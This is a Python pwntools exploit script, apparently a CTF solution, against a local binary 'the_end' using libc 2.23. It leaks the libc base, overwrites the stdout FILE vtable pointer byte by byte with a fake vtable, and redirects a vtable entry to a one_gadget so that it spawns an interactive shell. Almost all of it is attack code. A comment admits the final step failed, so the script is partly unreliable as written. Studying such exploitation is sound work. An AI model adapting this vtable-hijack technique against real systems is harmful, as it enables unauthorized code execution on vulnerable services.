#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
context.log_level = 'debug'
# context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
context.binary = './the_end-2.23'
success = lambda name, value: log.success('{} -> {:#x}'.format(name, value))
def debug():
    if local == 0:
        return
    binaryname = str(context.binary).split('/')[-1].replace("')", '')
    interruptPoint=[0x964]
    pid = int(os.popen('pgrep {}'.format(binaryname)).readlines()[-1])
    maps = os.popen('cat /proc/{}/maps'.format(pid))
    ELFaddr = 0
    libcaddr = 0
    for inf in maps.readlines():
        if ELFaddr == 0:
            if binaryname in inf:
                ELFaddr = int(inf.split('-', 1)[0], 16)
        if libcaddr == 0:
            if 'libc' in inf:
                libcaddr = int(inf.split('-', 1)[0], 16)
    info('pid : {}'.format(pid))
    success('elfbase', ELFaddr)
    success('libcbase', libcaddr)
    if len(interruptPoint) :
        for p in interruptPoint:
            success('interruptPoint', p+ELFaddr)
    raw_input('debug>')

local = 1

io = process('./the_end-2.23')
libc = ELF('./libc-2.23.so')


libcbase = int(io.recvline()[15:29], 16) - libc.sym['sleep']
success('libcbase', libcbase)

one_gadget = libcbase+0x3f42a
success('one_gadget', one_gadget)

stdout = libcbase+0x39c620
vtable_ptr = stdout+0xd8

fake_vtable = libcbase+0x39c588
fake_setbuf = fake_vtable+0x58

debug()
for i in range(2):
    io.send(p64(vtable_ptr+i))
    io.send(p64(fake_vtable)[i])


for i in range(3):
    io.send(p64(fake_setbuf+i))
    io.send(p64(one_gadget)[i])


# hack failed due to the one_gadget not meet
# but the script run to the one_gadget 
io.sendline("exec /bin/sh 1>&0")
io.interactive()

